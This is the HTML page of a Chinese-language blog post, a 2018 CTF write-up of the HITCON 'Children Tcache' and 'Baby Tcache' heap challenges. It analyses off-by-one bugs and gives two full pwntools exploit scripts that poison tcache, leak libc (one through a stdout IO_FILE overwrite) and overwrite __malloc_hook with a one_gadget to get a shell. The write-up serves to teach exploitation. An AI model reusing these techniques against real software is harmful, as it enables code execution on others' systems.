@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="referrer" content="no-referrer" />
+    <meta name="description" content="0x01 ChildrenTcache程序过程很简单三个功能：add，delete，view在add函数中： 12345678910111213141516171819202122232425262728293031323334unsigned __int64 add()&amp;#123;  signed int i; &#x2F;&#x2F; [rsp+Ch] [rbp-2034h]  char *d">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HITCON2018_Tcache">
+<meta property="og:url" content="http://yoursite.com/2018/10/23/HITCON2018-Tcache/index.html">
+<meta property="og:site_name" content="Kirin&#39;s Blog">
+<meta property="og:description" content="0x01 ChildrenTcache程序过程很简单三个功能：add，delete，view在add函数中： 12345678910111213141516171819202122232425262728293031323334unsigned __int64 add()&amp;#123;  signed int i; &#x2F;&#x2F; [rsp+Ch] [rbp-2034h]  char *d">
+<meta property="article:published_time" content="2018-10-23T11:25:48.000Z">
+<meta property="article:modified_time" content="2018-11-22T14:52:56.000Z">
+<meta property="article:author" content="Kirin">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>HITCON2018_Tcache</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2018/11/10/2018-XCTF-Finals/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2018/10/19/InCTF2018-load3r-wARMup-securepad/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/10/23/HITCON2018-Tcache/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/10/23/HITCON2018-Tcache/&text=HITCON2018_Tcache" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/10/23/HITCON2018-Tcache/&title=HITCON2018_Tcache" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/10/23/HITCON2018-Tcache/&is_video=false&description=HITCON2018_Tcache" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HITCON2018_Tcache&body=Check out this article: http://yoursite.com/2018/10/23/HITCON2018-Tcache/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/10/23/HITCON2018-Tcache/&title=HITCON2018_Tcache" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/10/23/HITCON2018-Tcache/&title=HITCON2018_Tcache" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/10/23/HITCON2018-Tcache/&title=HITCON2018_Tcache" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/10/23/HITCON2018-Tcache/&title=HITCON2018_Tcache" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/10/23/HITCON2018-Tcache/&name=HITCON2018_Tcache&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-ChildrenTcache"><span class="toc-number">1.</span> <span class="toc-text">0x01 ChildrenTcache</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-BabyTcache"><span class="toc-number">2.</span> <span class="toc-text">0x02 BabyTcache</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        HITCON2018_Tcache
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Kirin's Blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2018-10-23T11:25:48.000Z" itemprop="datePublished">2018-10-23</time>
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/CTF/" rel="tag">CTF</a>, <a class="tag-link" href="/tags/PWN/" rel="tag">PWN</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="0x01-ChildrenTcache"><a href="#0x01-ChildrenTcache" class="headerlink" title="0x01 ChildrenTcache"></a>0x01 ChildrenTcache</h3><p>程序过程很简单<br>三个功能：add，delete，view<br>在add函数中：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 add()</span><br><span class="line">&#123;</span><br><span class="line">  signed int i; &#x2F;&#x2F; [rsp+Ch] [rbp-2034h]</span><br><span class="line">  char *dest; &#x2F;&#x2F; [rsp+10h] [rbp-2030h]</span><br><span class="line">  unsigned __int64 size; &#x2F;&#x2F; [rsp+18h] [rbp-2028h]</span><br><span class="line">  char s; &#x2F;&#x2F; [rsp+20h] [rbp-2020h]</span><br><span class="line">  unsigned __int64 v5; &#x2F;&#x2F; [rsp+2038h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  memset(&amp;s, 0, 0x2010uLL);</span><br><span class="line">  for ( i &#x3D; 0; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( i &gt; 9 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;:(&quot;);</span><br><span class="line">      return __readfsqword(0x28u) ^ v5;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( !note_list[i] )</span><br><span class="line">      break;</span><br><span class="line">  &#125;</span><br><span class="line">  printf(&quot;Size:&quot;);</span><br><span class="line">  size &#x3D; get_num();</span><br><span class="line">  if ( size &gt; 0x2000 )</span><br><span class="line">    exit(-2);</span><br><span class="line">  dest &#x3D; (char *)malloc(size);</span><br><span class="line">  if ( !dest )</span><br><span class="line">    exit(-1);</span><br><span class="line">  printf(&quot;Data:&quot;);</span><br><span class="line">  sub_BC8((__int64)&amp;s, size);</span><br><span class="line">  strcpy(dest, &amp;s);</span><br><span class="line">  note_list[i] &#x3D; dest;</span><br><span class="line">  size_list[i] &#x3D; size;</span><br><span class="line">  return __readfsqword(0x28u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>存在off-by-one</strong>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sub_BC8((__int64)&amp;s, size);</span><br><span class="line">strcpy(dest, &amp;s);</span><br></pre></td></tr></table></figure>
+<p>思路：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">申请两个chunk进入unsort bin</span><br><span class="line">覆盖掉后一个chunk的prev_in_use位与前一个合并</span><br><span class="line">我们预先在两个chunk之间写入一个note</span><br><span class="line">这样当合并后我们就可以再分配一个note到同样位置</span><br><span class="line">并且在分配前此note会因为unsort bin分割chunk的时候写入main-area的附近特定地址</span><br><span class="line">我们view便可leak libc</span><br><span class="line">因为分配后两个note在同样位置</span><br><span class="line">便可造成tcache dup(类似double free)</span><br><span class="line">而后利用tcache poisoning，将chunk分配到malloc  hook或free hook前，覆盖其为one_gadget即可get shell</span><br></pre></td></tr></table></figure>
+<p>这里注意一下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">delete时，会：memset((void *)note_list[v1], 0xDA, size_list[v1]);</span><br><span class="line">我们需要连续申请和delete多次来清理0xda(详见EXP)</span><br><span class="line">tcache中chunk的fd指向的直接是chunk中的data地址，而不是prev_size</span><br><span class="line">tcache分配chunk时直接通过fd分配，不对fd地址chunk的size进行检查，在分配chunk到malloc hook或free hook前时不需要绕过检测</span><br></pre></td></tr></table></figure>
+<p><strong>EXP：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">def add(size,note):</span><br><span class="line">   p.recvuntil(&quot;: &quot;)</span><br><span class="line">   p.sendline(&quot;1&quot;)</span><br><span class="line">   p.recvuntil(&quot;:&quot;)</span><br><span class="line">   p.sendline(str(size))</span><br><span class="line">   p.recvuntil(&quot;:&quot;)</span><br><span class="line">   p.send(note)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">   p.recvuntil(&quot;: &quot;)</span><br><span class="line">   p.sendline(&quot;3&quot;)</span><br><span class="line">   p.recvuntil(&quot;:&quot;)</span><br><span class="line">   p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def view(index):</span><br><span class="line">   p.recvuntil(&quot;: &quot;)</span><br><span class="line">   p.sendline(&quot;2&quot;)</span><br><span class="line">   p.recvuntil(&quot;:&quot;)</span><br><span class="line">   p.sendline(str(index))</span><br><span class="line">	</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">#0x400-&gt;tcache</span><br><span class="line">#0x500-&gt;unsortbin</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;children_tcache&#39;,env &#x3D; &#123;&#39;LD_PRELOAD&#39;: &#39;.&#x2F;libc.so.6&#39;&#125;)</span><br><span class="line">add(0x500,&#39;kirin\n&#39;)</span><br><span class="line">add(0x28,&#39;kirin\n&#39;)</span><br><span class="line">add(0x4f0,&#39;kirin\n&#39;)</span><br><span class="line">add(0x20,&#39;kirin\n&#39;)</span><br><span class="line">delete(1)</span><br><span class="line">delete(0)</span><br><span class="line"></span><br><span class="line">#overwrite the pre_chunk_in_use and pre_size</span><br><span class="line">add(0x28,&#39;a&#39;*0x28)</span><br><span class="line">delete(0)</span><br><span class="line">#clean pre_size</span><br><span class="line">for i in range(8):</span><br><span class="line">   add(0x28-i-1,&#39;a&#39;*(0x28-i-1))</span><br><span class="line">   delete(0)</span><br><span class="line">add(0x28,&#39;a&#39;*0x20+p64(0x540))</span><br><span class="line"></span><br><span class="line">#unsortbin  </span><br><span class="line">#the mix of two chunks</span><br><span class="line">delete(2)</span><br><span class="line"></span><br><span class="line">#leak libc</span><br><span class="line">add(0x500,&#39;kirin\n&#39;)</span><br><span class="line">view(0)</span><br><span class="line">libc_base &#x3D; u64(p.recv(6).ljust(8,&#39;\x00&#39;))-0x60-0x3ebc40</span><br><span class="line">malloc_hook&#x3D;libc_base+0x3ebc30</span><br><span class="line">one_gadget&#x3D;libc_base+0x10a38c</span><br><span class="line"></span><br><span class="line">#double free</span><br><span class="line">add(0x28,&#39;kirin\n&#39;)</span><br><span class="line">delete(0)</span><br><span class="line">delete(2)</span><br><span class="line"></span><br><span class="line">#overwrite the malloc_hook</span><br><span class="line">add(0x28,p64(malloc_hook))</span><br><span class="line">add(0x28,&#39;kirin\n&#39;)</span><br><span class="line">add(0x28,p64(one_gadget))</span><br><span class="line"></span><br><span class="line">#get shell</span><br><span class="line">p.recvuntil(&quot;: &quot;)</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">p.recvuntil(&quot;:&quot;)</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="0x02-BabyTcache"><a href="#0x02-BabyTcache" class="headerlink" title="0x02 BabyTcache"></a>0x02 BabyTcache</h3><p>程序过程和ChildrenTcache类似<br>在add中：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">read_date((__int64)a1, size);</span><br><span class="line">a1[size] &#x3D; 0;                                 &#x2F;&#x2F; off by one</span><br><span class="line">note_list[i] &#x3D; a1;</span><br><span class="line">v0 &#x3D; size_list;</span><br><span class="line">size_list[i] &#x3D; size;</span><br></pre></td></tr></table></figure>
+<p><strong>同样存在off-by-one<br>不过缺少了view<br>这里关键是在不能像ChildrenTcache一样leak libc</strong><br>赛后想起ctf-wiki上介绍的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;ctf-wiki.github.io&#x2F;ctf-wiki&#x2F;pwn&#x2F;linux&#x2F;io_file&#x2F;exploit-in-libc2.24&#x2F;</span><br></pre></td></tr></table></figure>
+<p>思路：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">前面依然是ChildrenTcache的思路：</span><br><span class="line">申请两个chunk进入unsort bin</span><br><span class="line">覆盖掉后一个chunk的prev_in_use位与前一个合并</span><br><span class="line">我们预先在两个chunk之间写入一个note并delete使其进入tcache</span><br><span class="line">这样当合并后我们就可以再分配一个note到同样位置</span><br><span class="line">并且在分配前此note会因为unsort bin分割chunk的时候写入main-area的附近特定地址</span><br><span class="line">这时候 *(struct _IO_FILE_plus *) stdout的地址与现在此note上fd高字节相同，只是后三个字节不同，不过后三字节通过stdout相对libc文件的偏移即可得到：</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p &amp; *(struct _IO_FILE_plus *) stdout</span><br><span class="line">$1 &#x3D; (struct _IO_FILE_plus *) 0x7fa6148ea760 &lt;_IO_2_1_stdout_&gt;</span><br><span class="line"></span><br><span class="line">add一个和tcache中note大小不同的chunk覆盖低字节使fd指向stdout</span><br><span class="line">之前此note已经进入tcache，fd指向stdout</span><br><span class="line">便可以利用tcache分配一个chunk到stdout处</span><br><span class="line">我们覆盖掉IO_FILE结构体_IO_write_base的低字节</span><br><span class="line">使其在下次puts时输出我们修改后的_IO_write_base到_IO_write_ptr&#x2F;_IO_write_end的数据</span><br><span class="line">以此leak libc后</span><br><span class="line">而后类似ChildrenTcache，利用tcache dup，将chunk分配到malloc  hook或free hook前，覆盖其为one_gadget即可get shell</span><br></pre></td></tr></table></figure>
+<p>这里注意：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">我们可以通过偏移获得stdout后三位地址，不过因为覆盖时只能按字节覆盖，倒数第四位需要爆破一下，1&#x2F;16的几率成功</span><br><span class="line"></span><br><span class="line">覆盖地址时发现IO_FILE的flags需要满足：</span><br><span class="line">flags&amp;0x1000&#x3D;&#x3D;1</span><br><span class="line">应该是我们利用了_IO_write_base，如果需要输出_IO_write_base到_IO_write_ptr&#x2F;_IO_write_end的数据需要绕过检测</span><br><span class="line">具体等过些时间研究一下源码</span><br></pre></td></tr></table></figure>
+<p><strong>EXP：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">def add(size,note):</span><br><span class="line">   p.recvuntil(&quot;: &quot;)</span><br><span class="line">   p.sendline(&quot;1&quot;)</span><br><span class="line">   p.recvuntil(&quot;:&quot;)</span><br><span class="line">   p.sendline(str(size))</span><br><span class="line">   p.recvuntil(&quot;:&quot;)</span><br><span class="line">   p.send(note)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">   p.recvuntil(&quot;: &quot;)</span><br><span class="line">   p.sendline(&quot;2&quot;)</span><br><span class="line">   p.recvuntil(&quot;:&quot;)</span><br><span class="line">   p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">for i in range(0x20):</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">  p&#x3D;process(&quot;.&#x2F;baby_tcache&quot;,env &#x3D; &#123;&#39;LD_PRELOAD&#39;: &#39;.&#x2F;libc.so.6&#39;&#125;)</span><br><span class="line">  add(0x500,&#39;kirin\n&#39;)</span><br><span class="line">  add(0x68,&#39;kirin\n&#39;)</span><br><span class="line">  add(0x4f0,&#39;kirin\n&#39;)</span><br><span class="line">  add(0x20,&#39;kirin\n&#39;)</span><br><span class="line">  delete(1)</span><br><span class="line">  delete(0)</span><br><span class="line"></span><br><span class="line">  #overwrite the pre_chunk_in_use and pre_size</span><br><span class="line">  add(0x68,&#39;a&#39;*0x68)</span><br><span class="line">  delete(0)</span><br><span class="line">  #clean pre_size</span><br><span class="line">  for i in range(8):</span><br><span class="line">     add(0x68-i-1,&#39;a&#39;*(0x68-i-1))</span><br><span class="line">     delete(0)</span><br><span class="line">  add(0x68,&#39;a&#39;*0x60+p64(0x580))</span><br><span class="line">  delete(2)</span><br><span class="line">  delete(0)</span><br><span class="line">  add(0x500,&#39;kirin\n&#39;)</span><br><span class="line">  </span><br><span class="line">  #overwrite the low byte of fd</span><br><span class="line">  add(0x78,&#39;\x60\x67&#39;)</span><br><span class="line">  #gdb.attach(p)</span><br><span class="line">  add(0x68,&#39;kirin\n&#39;)</span><br><span class="line">  try:</span><br><span class="line">    #overwrite the _IO_write_base</span><br><span class="line">    #leak libc</span><br><span class="line">    add(0x60,p64(0xfbad1887) + p64(0)*3 + &quot;\x00&quot;)</span><br><span class="line">    s&#x3D;p.recv(32)[8:16]</span><br><span class="line">    libc_base &#x3D; u64(s)-0x3ed8b0</span><br><span class="line">    malloc_hook&#x3D;libc_base+0x3ebc30</span><br><span class="line">    one_gadget&#x3D;libc_base+0x10a38c</span><br><span class="line">    delete(1)</span><br><span class="line">    delete(2)</span><br><span class="line"></span><br><span class="line">    #overwrite the malloc_hook</span><br><span class="line">    add(0x78,p64(malloc_hook))</span><br><span class="line">    add(0x78,&#39;kirin\n&#39;)</span><br><span class="line">    add(0x78,p64(one_gadget))</span><br><span class="line"></span><br><span class="line">    #get shell</span><br><span class="line">    p.recvuntil(&quot;: &quot;)</span><br><span class="line">    p.sendline(&quot;1&quot;)</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(&#39;1&#39;)</span><br><span class="line">    p.interactive()</span><br><span class="line">  except:</span><br><span class="line">    p.close()</span><br></pre></td></tr></table></figure>
+
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-ChildrenTcache"><span class="toc-number">1.</span> <span class="toc-text">0x01 ChildrenTcache</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-BabyTcache"><span class="toc-number">2.</span> <span class="toc-text">0x02 BabyTcache</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/10/23/HITCON2018-Tcache/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/10/23/HITCON2018-Tcache/&text=HITCON2018_Tcache" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/10/23/HITCON2018-Tcache/&title=HITCON2018_Tcache" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/10/23/HITCON2018-Tcache/&is_video=false&description=HITCON2018_Tcache" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HITCON2018_Tcache&body=Check out this article: http://yoursite.com/2018/10/23/HITCON2018-Tcache/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/10/23/HITCON2018-Tcache/&title=HITCON2018_Tcache" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/10/23/HITCON2018-Tcache/&title=HITCON2018_Tcache" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/10/23/HITCON2018-Tcache/&title=HITCON2018_Tcache" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/10/23/HITCON2018-Tcache/&title=HITCON2018_Tcache" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/10/23/HITCON2018-Tcache/&name=HITCON2018_Tcache&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 Kirin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
